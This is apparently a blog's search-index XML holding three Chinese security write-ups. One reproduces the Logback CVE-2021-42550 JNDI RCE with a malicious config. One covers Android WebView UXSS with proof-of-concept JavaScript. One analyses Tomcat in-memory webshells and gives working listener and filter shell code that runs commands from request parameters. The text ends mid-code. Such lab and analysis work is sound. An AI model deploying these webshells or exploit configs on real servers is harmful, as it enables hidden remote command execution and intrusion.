<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2021-42550漏洞复现</title>
      <link href="2024/03/10/CVE-2021-42550%E5%A4%8D%E7%8E%B0/"/>
      <url>2024/03/10/CVE-2021-42550%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>攻击者可以通过更改 Logback 配置文件添加或构造恶意配置，从而可以执行 LDAP 服务器上加载的任意代码</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul><li>Logback版本 &lt; 1.2.9</li><li>Logback版本 &lt; 1.3.0-alpha11</li></ul><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul><li>拥有对logback.xml的修改权限</li><li>使用的Logback版本 &lt; 1.2.9</li><li>重新加载了恶意的配置数据，这意味着应用程序重新启动或者之前设置了scan=”true”。</li></ul><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p><img src="https://s2.loli.net/2022/10/25/qiH8ytfhP4Ylj2L.png" alt="image-20221025171556559"></p><p>1.2.7版本logback</p><p>文件上传，可以借此功能更改Logback 配置文件</p><p><img src="https://s2.loli.net/2022/10/25/JVZj4MmSlv7nezo.png" alt="image-20221025171644084"></p><p>启动实验环境后，上传文件，burp抓包至repeater</p><p><a href="http://localhost:8080/upload.html">http://localhost:8080/upload.html</a></p><p><img src="https://s2.loli.net/2022/10/25/OXDqCU9TAI7hzJW.png" alt="image-20221025172651277"></p><p>test.txt上传到了下面这个文件夹下</p><p><img src="https://s2.loli.net/2022/10/25/loh9YSyDZmuetx5.png" alt="image-20221025172906474"></p><p>与此同时，开启ldap服务器，进行jndi注入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&quot;calc.exe&quot;</span> -A <span class="number">127.0</span>.<span class="number">0.1</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/10/25/buIvXCcn8q9G6Zd.png" alt="image-20221025173404410"></p><p>burp上传配置文件 logback-spring.xml，内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span> <span class="attr">scan</span>=<span class="string">&quot;true&quot;</span> <span class="attr">scanPeriod</span>=<span class="string">&quot;10 seconds&quot;</span> <span class="attr">debug</span>=<span class="string">&quot;true&quot;</span>&gt;</span>  </span><br><span class="line">   　　　<span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;STDOUT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span>  </span><br><span class="line">       　　　　　 <span class="tag">&lt;<span class="name">encoder</span>&gt;</span>  </span><br><span class="line">       　　　　　　　　　<span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%-4relative [%thread] %-5level %logger&#123;35&#125; - %msg %n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span>  </span><br><span class="line">       　　　　　 <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span>  </span><br><span class="line">       　　　<span class="tag">&lt;/<span class="name">appender</span>&gt;</span>  </span><br><span class="line">       <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;DB&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.classic.db.DBAppender&quot;</span>&gt;</span>  </span><br><span class="line">           <span class="tag">&lt;<span class="name">connectionSource</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">jndiLocation</span>&gt;</span>ldap://127.0.0.1:1389/yqjuyg<span class="tag">&lt;/<span class="name">jndiLocation</span>&gt;</span>  </span><br><span class="line">           <span class="tag">&lt;/<span class="name">connectionSource</span>&gt;</span>  </span><br><span class="line">       <span class="tag">&lt;/<span class="name">appender</span>&gt;</span>  </span><br><span class="line">     </span><br><span class="line">       　　　<span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;DEBUG&quot;</span>&gt;</span>  </span><br><span class="line">       　　　　　　<span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;STDOUT&quot;</span> /&gt;</span>  </span><br><span class="line">       　　　<span class="tag">&lt;/<span class="name">root</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置文件xml解析读取LDAP监听 ldap://127.0.0.1:1389/yqjuyg，从而执行calc.exe</p><p><img src="https://s2.loli.net/2022/10/25/wWzBHTCgY5j3tS1.png" alt="image-20221025173059311"></p><p>最终，配置文件上传成功，成功弹出了计算器</p><p><img src="https://s2.loli.net/2022/10/25/wCUGB1WV5ot4cnH.png" alt="image-20221025173936588"></p><p>JNDI监听工具: <a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><p>复现环境：<a href="https://github.com/cn-panda/logbackRceDemo">https://github.com/cn-panda/logbackRceDemo</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webview intent uxss</title>
      <link href="2024/03/10/webview%20%20intent%20uxss/"/>
      <url>2024/03/10/webview%20%20intent%20uxss/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="域控制不严格"><a href="#域控制不严格" class="headerlink" title="域控制不严格"></a>域控制不严格</h2><p>android中使用js的file域加载的js代码能够进行同源策略跨域访问。</p><ul><li>当设置<strong>webView.getSettings().setAllowFileAccess(true);</strong> 允许webview<strong>使用file协议</strong></li><li>当设置<strong>webView.getSettings().setAllowFileAccessFromFileURLs(true);</strong>  允许通过file协议加载的js读取其他<strong>本地文件</strong></li><li>当设置<strong>webView.getSettings().setAllowUniversalAccessFromFileURLs(true);**允许通过file协议加载的js访问</strong>任意域**</li></ul><p>结合intent传递，A应用可以通过B应用导出的webviewactivity让B加载一个恶意的file协议加载url，从而获取B应用的内部数据。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = getIntent();</span><br><span class="line">String url = intent.getData().toString();</span><br><span class="line">webView.loadUrl(url);</span><br></pre></td></tr></table></figure><h2 id="UXSS"><a href="#UXSS" class="headerlink" title="UXSS"></a>UXSS</h2><p>UXSS（Universal Cross-Site Scfipting）通用型XSS，不同于常见的XSS，常见的XSS漏洞<strong>源于WEB站点或者应用</strong>，但受同源策略的约束，攻击者只能访问存在漏洞的站点的会话信息，无法访问其他域的会话信息；而UXSS是一种<strong>利用浏览器或者浏览器扩展漏洞</strong>来制造产生XSS的条件并执行代码的一种攻击类型，不需要网站本身存在漏洞也可以触发漏洞，攻击者可以获取到浏览器打开和缓存的所有页面（不同域）的会话信息。由于android使用的是Google的webkit内核，并将其作为webview组件封装在SDK中，所以UXSS在android中同样存在。</p><h3 id="CVE-2011-3881"><a href="#CVE-2011-3881" class="headerlink" title="CVE-2011-3881"></a>CVE-2011-3881</h3><p>POC（Google Chrome &lt;= 15.0.874.102 &amp;&amp; Android &lt;= 4.4）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    object = <span class="built_in">document</span>.createElement(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">    object.data = <span class="string">&quot;http://baidu.com/&quot;</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(object);</span><br><span class="line">    object.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    object.data = <span class="string">&quot;javascript:alert(document.body.innerHTML)&quot;</span>;</span><br><span class="line">    object.innerHTML = <span class="string">&quot;foo&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;&lt;/script&gt;</span><br><span class="line">hello im webkit uxss</span><br></pre></td></tr></table></figure><p>该漏洞主要由于HTMLPlugInImageElement::allowedToLoadFrameURL函数中对Javascript URL地址校验不足,对源检测不全导致的跨域问题</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220628153525.png" alt="image-20220628153525463"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220628154155.png" alt="image-20220628154155832"></p><p>uxsspoc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;button value&#x3D;&quot;test&quot; onclick&#x3D;&quot;</span><br><span class="line">  a&#x3D;document.createElement(&#39;script&#39;);</span><br><span class="line">  a.id&#x3D;&#39;AA&#39;;</span><br><span class="line">  a.src&#x3D;&#39;\u0000https:&#x2F;&#x2F;js.stripe.com&#x2F;v2&#x2F;&#39;;</span><br><span class="line">  document.body.appendChild(a);</span><br><span class="line">  setTimeout(function()&#123;if(typeof(document.getElementById(&#39;AA&#39;))!&#x3D;&#x3D;&#39;undefined&#39;)&#123;alert(1);&#125;</span><br><span class="line">else&#123;alert(2);&#125;&#125;, 400);</span><br><span class="line">return false;&quot;&gt;</span><br><span class="line">u0000 test</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.fooying.com/uxss/">通用跨站脚本攻击(UXSS)</a></p><p><a href="https://cyberxplore.medium.com/how-we-are-able-to-hack-any-company-by-sending-message-including-facebook-google-microsoft-b7773626e447">How We Are Able To Hack Any Company By Sending Message - $20,000 Bounty [CVE-2021–34506]</a></p><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=144813">https://bugs.chromium.org/p/chromium/issues/detail?id=144813</a></p><p><a href="https://www.mbsd.jp/Whitepaper/IntentScheme.pdf">https://www.mbsd.jp/Whitepaper/IntentScheme.pdf</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> android安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于Tomcat的内存马分析</title>
      <link href="2024/03/10/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"/>
      <url>2024/03/10/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前简单了解了tomcat的架构，这次就基于tomcat架构来学习内存马。</p><h2 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h2><p>学习内存马之前，我们要将最常用的三个context搞清楚：ServletContext、ApplicationContext、StandardContext</p><p>context叫做上下文容器，可以看成一个web 应用，一个host可以有很多web应用，而一个context又有很多wrapper，也就是一个context有很多客户端请求，servlet就是专门处理客户端请求的动态资源。</p><h3 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h3><p>ServletContext是用来保存一个web应用中所有servlet的上下文信息，可以通过ServletContext来对某个应用的资源进行访问和操作，其对应的类是javax.servlet.ServletContext</p><h3 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h3><p>在tomcat中，ServletContext接口的具体实现就是ApplicationContext类。</p><h3 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h3><p><code>org.apache.catalina.core.StandardContext</code>是子容器<code>Context</code>的标准实现类，其中包含了对Context子容器中资源的各种操作。</p><p>一张图来表示各Context的关系</p><p><img src="https://s2.loli.net/2022/11/15/gqn52NCmWQ4xa3c.jpg" alt="img"></p><p>ServletContext接口的实现类为ApplicationContext类和ApplicationContextFacade类，其中ApplicationContextFacade是对ApplicationContext类的包装。我们对Context容器中各种资源进行操作时，最终调用的还是StandardContext中的方法，因此<code>StandardContext</code>是Tomcat中负责与底层交互的Context。</p><h2 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h2><p>内存马<strong>核心原理</strong>就是动态地将恶意组件添加到正在运行的服务器中。</p><p>而这一技术的实现有赖于官方对Servlet3.0的升级，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上。</p><h3 id="listener型"><a href="#listener型" class="headerlink" title="listener型"></a>listener型</h3><p>那么我们只要在服务器中动态注册一个恶意的listener即可。listener根据事件源分类，分为三种：</p><ul><li>ServletContextListener</li><li>HttpSessionListener</li><li>ServletRequestListener</li></ul><p>其中，最适合当内存马的就是ServletRequestListener，因为他是来监听ServletRequest对象的，而不管访问任何资源，都会触发<code>ServletRequestListener#requestInitialized()</code>方法。</p><p>新建一个FirstListener类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstListener</span> <span class="keyword">implements</span> <span class="title">ServletRequestListener</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line">        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">        String command = req.getParameter(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (command != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                InputStream in = Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                n.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时不管访问什么路由，只要访问c参数都可以命令执行。</p><p><img src="https://s2.loli.net/2022/11/15/g7UOrqdFMsVlX1J.png" alt="image-20221115135158317"></p><h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>调用栈如下：</p><p><img src="https://s2.loli.net/2022/11/15/Zxw3TLWb9J7PG4r.png" alt="image-20221115135624773"></p><p>跟进StandardContext#fireRequestInitEvent </p><p><img src="https://s2.loli.net/2022/11/15/byTC9PVLQI4OrUY.png" alt="image-20221115174911956"></p><p>通过getApplicationEventListeners()获取listener数组，然后遍历 调用listener.requestInitialized(event)方法触发监听器。</p><p><img src="https://s2.loli.net/2022/11/15/AUJO7Mu814oNCzl.png" alt="image-20221115180447355"></p><p><img src="https://s2.loli.net/2022/11/15/kUDOuCQVxc9j4Bi.png" alt="image-20221115180421994"></p><p>触发后，通过getApplicationEventListeners获取的StandardContext中的Listener数组，并将我们创建的listener添加进去。</p><p>在<code>StandardHostValve#invoke</code>中，可以看到其通过request对象来获取<code>StandardContext</code>类</p><p><img src="https://s2.loli.net/2022/11/16/ExQjtkPZ5gcial4.png" alt="image-20221116133659687"></p><p>jsp 用同样的方式获取写法如下：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    Field reqF = request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Request req = (Request) reqF.get(request);</span><br><span class="line">    StandardContext context = (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>添加监听器：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">Shell_Listener shell_Listener = <span class="keyword">new</span> Shell_Listener();</span><br><span class="line">    context.addApplicationEventListener(shell_Listener);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>实现步骤：</p><ol><li>获取StandardContext上下文</li><li>实现一个恶意Listener</li><li>通过StandardContext#addApplicationEventListener方法添加恶意Listener</li></ol><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Shell_Listener</span> <span class="keyword">implements</span> <span class="title">ServletRequestListener</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line">            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">           String cmd = request.getParameter(<span class="string">&quot;listener&quot;</span>);</span><br><span class="line">           <span class="keyword">if</span> (cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   Runtime.getRuntime().exec(cmd);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                   n.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    Field reqF = request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Request req = (Request) reqF.get(request);</span><br><span class="line">    StandardContext context = (StandardContext) req.getContext();</span><br><span class="line"> </span><br><span class="line">    Shell_Listener shell_Listener = <span class="keyword">new</span> Shell_Listener();</span><br><span class="line">    context.addApplicationEventListener(shell_Listener);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>shell脚本部署在服务器之后，进行访问</p><p><img src="https://s2.loli.net/2022/11/16/ivhxENqfybLmMRD.png" alt="image-20221116140335339"></p><p>内存马注入后，在任何路径访问均可</p><p><img src="https://s2.loli.net/2022/11/16/rG5XcPCQOqRUnZx.png" alt="image-20221116140605447"></p><p>listener组件的内存马就这样实现了。</p><h3 id="Filiter型"><a href="#Filiter型" class="headerlink" title="Filiter型"></a>Filiter型</h3><p>filter是通过过滤器来拦截severlet请求中的参数，作为过滤器中的参数，来调用自定义过滤器中的恶意函数</p><p>一个filter类的实现要有：init() 、doFilter() 、destroy() ，并在web.xml进行配置</p><p><img src="https://s2.loli.net/2022/11/18/TpKUP9fR4NMyvtd.png" alt="image-20221118093616967"></p><p>我们在filterChain.doFilter(servletRequest,servletResponse); 下断点进行</p><h4 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h4><p><img src="https://s2.loli.net/2022/11/18/qd4DgAetwLK9rpj.png" alt="image-20221118112024402"></p><p>发现ApplicationFilterChain类传递的filter信息，这里面第二个过滤器是tomcat自带的</p><p><img src="https://s2.loli.net/2022/11/18/wCB2YabuqRPVf4v.png" alt="image-20221118113813169"></p><p><img src="https://s2.loli.net/2022/11/18/U6PiRsIH2hekry7.png" alt="image-20221118113851879"></p><p>这里说明filter的加载是按照顺序进行加载的。</p><p><img src="https://s2.loli.net/2022/11/18/lnf1PVZyspzFk2q.png" alt="image-20221118114056873"></p><p>所以filter处理流程：ApplicationFilterChain—— $this-&gt;filter——filterConfig——filterConfig.filter——filter——dofilter——调用自定义filter</p><p>而ApplicationFilterChain是在利用ApplicationFilterFactory 创建的</p><p><img src="https://s2.loli.net/2022/11/18/etr93IlFLbV4odC.png" alt="image-20221118115345548"></p><p>在createFilterChain方法中，首先会调用getParent获取当前的Context，然后回从Context中获取filterMaps 也就是web.xml中的配置</p><p><img src="https://s2.loli.net/2022/11/18/yYxOGXpoUmNvQeg.png" alt="image-20221118115726203"></p><p>遍历 FilterMaps 中的 FilterMap，如果发现符合当前请求 url 与 FilterMap 中的 urlPattern 相匹配，就会进入 if 判断会调用 findFilterConfig 方法在 filterConfigs 中寻找对应 filterName名称的 FilterConfig，然后如果不为null，就进入 if 判断，将 filterConfig 添加到 filterChain中<img src="https://s2.loli.net/2022/11/18/mCrctEG6NdYVXgP.png" alt="image-20221118120608769"></p><p>跟进addFilter函数，在addFilter函数中首先会遍历filters，判断我们的filter是否已经存在，不存在的话，会将我们的filterConfig 添加到 filters中。</p><p><img src="https://s2.loli.net/2022/11/18/KmbzGsjWEixO2u7.png" alt="image-20221118131015486"></p><p>filterChain已经构造完毕，最后回来doFilter,调用 Filter 链上的 doFilter方法，触发internalDoFilter </p><p><img src="https://s2.loli.net/2022/11/18/MCtJ7RkvbZ4HmzG.png" alt="image-20221118131638552"></p><p>经过分析，我们的关键就是要在filterChain中添加进我们的恶意filter，也就是在FilterConfig中添加相应的配置，而fiterConfig的内容都是从context中得到，因此只要我们能控制context的内容就行了</p><blockquote><p>FilterDefs：存放 FilterDef 的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例等基本信息<br>FilterConfigs：存放 filterConfig 的数组，在 FilterConfig 中主要存放 FilterDef 和Filter 对象等信息<br>FilterMaps：存放 FilterMap 的数组，在 FilterMap 中主要存放了 FilterName 和 对应的 URLPattern</p></blockquote><p>只有我们将filter ，FilterDefs，FilterMaps添加到FilterConfigs中就可以添加filter了</p><p><img src="https://s2.loli.net/2022/11/18/MpiKlBGFfzWdOj4.png" alt="image-20221118132805371"></p><p>最终，filter内存马创建思路：</p><ol><li>获取StandardContext对象</li><li>创建恶意Filter</li><li>使用FilterDef对Filter进行封装，并添加必要的属性</li><li>创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中</li><li>使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</li></ol><h4 id="获取StandardContext"><a href="#获取StandardContext" class="headerlink" title="获取StandardContext"></a>获取StandardContext</h4><p>Tomcat在启动时会为每个Context都创建个ServletContext对象，来表示一个Context，从而可以将ServletContext转化为StandardContext。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取ApplicationContextFacade类</span></span><br><span class="line">ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line"> </span><br><span class="line"><span class="comment">//反射获取ApplicationContextFacade类属性context为ApplicationContext类</span></span><br><span class="line">Field appContextField = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appContextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//反射获取ApplicationContext类属性context为StandardContext类</span></span><br><span class="line">Field standardContextField = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);</span><br></pre></td></tr></table></figure><h4 id="创建恶意filter"><a href="#创建恶意filter" class="headerlink" title="创建恶意filter"></a>创建恶意filter</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Shell_Filter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        String cmd=request.getParameter(<span class="string">&quot;filter&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">            n.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="使用FilterDef封装filter"><a href="#使用FilterDef封装filter" class="headerlink" title="使用FilterDef封装filter"></a>使用FilterDef封装filter</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span 